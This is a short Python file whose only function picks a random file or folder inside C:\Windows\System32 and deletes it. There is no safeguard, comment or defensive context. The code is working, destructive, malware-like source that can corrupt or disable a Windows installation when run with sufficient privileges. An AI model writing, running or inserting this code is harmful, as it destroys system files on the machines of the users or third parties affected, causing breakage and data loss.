import os
import random
import shutil


def delete_random_item():
    path = r"C:\Windows\System32"
    if not os.path.exists(path):
        return

    items = os.listdir(path)

    if not items:
        return

    random_item = random.choice(items)
    item_path = os.path.join(path, random_item)

    if os.path.isfile(item_path):
        os.remove(item_path)
    elif os.path.isdir(item_path):
        shutil.rmtree(item_path)
